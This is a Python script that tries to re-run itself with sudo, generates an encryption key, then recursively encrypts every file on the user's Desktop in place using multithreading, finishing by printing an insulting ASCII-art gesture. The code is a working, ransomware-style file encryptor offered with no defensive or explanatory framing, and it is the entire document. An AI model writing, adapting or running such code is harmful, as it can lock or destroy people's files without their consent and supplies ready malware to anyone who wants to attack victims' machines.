import os
import sys
import subprocess
import platform
import logging
import signal
import time
import psutil
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

def setup_logging():
    """
    Set up logging configuration.
    """
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        handlers=[logging.StreamHandler()])

def elevate_privileges_if_needed():
    """
    Elevate privileges if running on Linux and not as root.
    """
    if platform.system() == "Linux" and os.geteuid() != 0:
        logging.info("Not running as root. Attempting to elevate privileges...")
        try:
            subprocess.run(['sudo', 'python3'] + sys.argv)
            sys.exit(0)
        except Exception as e:
            logging.error(f"Privilege elevation failed: {e}")
            sys.exit(1)
    elif platform.system() == "Windows":
        logging.info("Please run as administrator.")

def generate_encryption_key():
    """
    Generate a new encryption key and save it to a file.
    """
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(file_path, key):
    """
    Encrypt a file using the provided encryption key.
    """
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        logging.info(f"Encrypted: {file_path}")
    except Exception as e:
        logging.error(f"Encryption failed for {file_path}: {e}")

def find_files_to_encrypt(root_dir):
    """
    Find files to encrypt in the specified root directory.
    """
    for root, _, files in os.walk(root_dir):
        for file in files:
            yield os.path.join(root, file)

def handle_bus_error(signum, frame):
    """
    Handle bus error signal.
    """
    logging.error(f"Bus error (signal {signum}).")
    time.sleep(1)

def encrypt_files_with_resource_checks(root_dir, key, chunk_size=100):
    """
    Encrypt files in the specified root directory with resource checks.
    """
    files = find_files_to_encrypt(root_dir)
    file_chunk = []
    
    for file in files:
        file_chunk.append(file)
        if len(file_chunk) >= chunk_size:
            process_file_chunk(file_chunk, key)
            file_chunk = []
    
    if file_chunk:
        process_file_chunk(file_chunk, key)

def process_file_chunk(file_chunk, key):
    """
    Process a chunk of files, encrypting them with the provided encryption key.
    """
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
    cpu_usage = psutil.cpu_percent(interval=1)
    logging.debug(f"Available memory: {available_memory:.2f}%, CPU usage: {cpu_usage:.2f}%")
    
    if available_memory < 20:
        logging.warning("Low memory. Pausing encryption for 5 seconds...")
        time.sleep(5)
    
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file, key): file for file in file_chunk}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error encrypting file: {e}")

def main():
    """
    Main function to run the encryption process on the user's desktop.
    """
    setup_logging()
    elevate_privileges_if_needed()
    key = generate_encryption_key()

    if platform.system() == "Windows":
        desktop_dir = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    else:
        desktop_dir = os.path.join(os.path.expanduser('~'), 'Desktop')

    logging.info(f"Encrypting files on desktop: {desktop_dir}")

    encrypt_files_with_resource_checks(desktop_dir, key)

if __name__ == "__main__":
    main()

    bird = """
    ░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ██████▄███▄████░░███▄░░░░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
    ▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
    █████▀░░░░▀▀████████░░░░░░
    """
    print(bird)
